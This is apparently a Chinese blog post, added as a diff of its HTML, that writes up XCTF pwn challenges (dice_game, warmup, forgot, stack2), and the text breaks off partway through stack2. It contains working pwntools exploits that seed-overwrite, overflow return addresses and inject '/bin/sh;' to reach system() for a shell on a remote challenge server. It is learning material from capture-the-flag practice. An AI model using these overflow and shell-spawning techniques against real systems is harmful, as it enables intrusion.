@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"winny1001.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":400},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="攻防世界pwn高手进阶记录，持续更新">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界pwn高手进阶">
+<meta property="og:url" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/index.html">
+<meta property="og:site_name" content="Winny的一亩三分地">
+<meta property="og:description" content="攻防世界pwn高手进阶记录，持续更新">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242345912.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242499901.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242784679.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567245274637.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/2019-09-01_184730.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335394443.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335494006.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335649804.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567339763954.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567340251686.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567597713534.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567597827722.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568275633125.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568275967093.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568276152606.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568299593922.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568301479701.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568301778145.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568260260975.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568260146451.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568265875900.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568261009433.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568302057127.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568266254184.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066823941.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066856025.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066925488.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572066976502.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067033370.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067142663.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067798113.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067814376.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1572067848834.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191030110610797.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102091949539.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102092031860.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102091742929.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160837726.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160909600.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160330688.png">
+<meta property="og:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/image-20191102160654357.png">
+<meta property="article:published_time" content="2019-09-12T15:08:13.000Z">
+<meta property="article:modified_time" content="2024-06-11T08:39:54.288Z">
+<meta property="article:author" content="Winny">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242345912.png">
+
+
+<link rel="canonical" href="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/","path":"2019/09/13/CTF/攻防世界pwn高手进阶/","title":"攻防世界pwn高手进阶"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>攻防世界pwn高手进阶 | Winny的一亩三分地</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Winny的一亩三分地</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"> Imagination will take you everywhere</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice_game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#warmup"><span class="nav-number">2.</span> <span class="nav-text">warmup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#forgot"><span class="nav-number">3.</span> <span class="nav-text">forgot</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#stack2"><span class="nav-number">4.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn-100"><span class="nav-number">5.</span> <span class="nav-text">pwn-100</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mary_morton"><span class="nav-number">6.</span> <span class="nav-text">mary_morton</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#monkey"><span class="nav-number">7.</span> <span class="nav-text">monkey</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn1"><span class="nav-number">8.</span> <span class="nav-text">pwn1</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Winny</p>
+  <div class="site-description" itemprop="description">因为热爱，所以折腾</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/winny1001" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;winny1001" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://winny1001.github.io/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Winny">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Winny的一亩三分地">
+      <meta itemprop="description" content="因为热爱，所以折腾">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="攻防世界pwn高手进阶 | Winny的一亩三分地">
+      <meta itemprop="description" content="攻防世界pwn高手进阶记录，持续更新">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界pwn高手进阶
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2019-09-13 00:08:13" itemprop="dateCreated datePublished" datetime="2019-09-13T00:08:13+09:00">2019-09-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-06-11 17:39:54" itemprop="dateModified" datetime="2024-06-11T17:39:54+09:00">2024-06-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">攻防世界pwn高手进阶记录，持续更新</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="dice_game">dice_game</h1>
+<p>IDA看一下：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242345912.png" class="" width="1567242345912">
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242499901.png" class="" width="1567242499901">
+<p>这个和新手训练的guess_num一样都是猜数字，buf溢出改seed。：不多说了。</p>
+<p>唯一的问题是附件中给的libc.so.6我好像没法用，写的exp一直提示我Illegal
+instruction (core dumped)，很迷。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">30940</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/dice_game&#x27;)</span></span><br><span class="line">c = CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br><span class="line">c.srand(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;point(1~6):&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(c.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567242784679.png" class="" width="1567242784679">
+<h1 id="warmup">warmup</h1>
+<p>这个题没给附件……我看了看别人的wp的代码，就是一个很简单的溢出，cat
+flag函数都现成的。直接写exp就行了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">41547</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567245274637.png" class="" width="1567245274637">
+<h1 id="forgot">forgot</h1>
+<p>题目描述：福克斯最近玩弄有限状态自动机。在探索概念实现正则表达式使用FSA他想实现一个电子邮件地址验证。
+最近，Lua开始骚扰福克斯。对此，福克斯向Lua挑战斗智斗勇。福克斯承诺要奖励Lua，如果她能到不可达状态在FSA他实施过渡。可以在这里访问复制。
+运行服务hack.bckdr.in:8009</p>
+<p>看一下源码：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/2019-09-01_184730.png" class="" title="2019-09-01_184730">
+<p>for循环是判断输入字符串是否符合格式，例如sub_8048702(v2[i])就是判断首字母是否为小写字母或数字或特定字符：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335394443.png" class="" width="1567335394443">
+<p>第88行的代码是根据v14的值调用v3~v12中的一个函数（输出字符串）。例如v3：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335494006.png" class="" width="1567335494006">
+<p>该程序调用函数和参数都是根据偏移量来调用，</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567335649804.png" class="" width="1567335649804">
+<p>程序中有system函数，因此我们的思路就是通过栈溢出让程序执行system函数，那么我们要知道我们输入的字符串的位置。</p>
+<p>观察汇编代码可以得到v2（我们输入的字符串）的地址为[esp+10h]</p>
+<p>于是开始构造exp运行，构造的过程中我发现调用system之后system执行的命令就是我们输入的字符串：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567339763954.png" class="" width="1567339763954">
+<p>所以可以直接输入/bin/sh，但是只输入/bin/sh不能达到栈溢出的目的，需要占位符。用
+; 来隔离后面的无用的占位符，确保命令能正常执行。</p>
+<p>如果我们输入/bin/sh，那么程序在判断输入字符串是否符合格式的时候就会调用sub_8048618()，因此我们就要修改[esp+34h]的地址为system的地址。那么和我们的[esp+10h]之间的偏移量就是36，也就是我们需要输入36个字符。</p>
+<p>得到exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">35636</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/forgot&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;../files/forgot&#x27;</span>)</span><br><span class="line">sys = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span> + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;w&#x27;</span> * <span class="number">28</span> + p32(sys)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;validate\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567340251686.png" class="" width="1567340251686">
+<h1 id="stack2">stack2</h1>
+<p>程序是一个求平均数的软件，输入一个数组，可以查看当前数组、添加和修改数组中的数还有求平均数。</p>
+<p>看一下源码：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567597713534.png" class="" width="1567597713534">
+<p>发现在修改数的时候没有判断数组越界，所以可以构造栈溢出。</p>
+<p>看一下程序中发现有hackme函数：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1567597827722.png" class="" width="1567597827722">
+<p>那么就是构造栈溢出让程序返回到hackhere。</p>
+<p>我们在第60行下断点，动态调试一下：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568275633125.png" class="" width="1568275633125">
+<p>此时堆栈如图，可以看到FF942C68是v13的起始地址。</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568275967093.png" class="" width="1568275967093">
+<p>继续调试，按5退出，观察函数调用情况：</p>
+<img src="/2019/09/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1568276152606.png" class="" width="1568276152606">
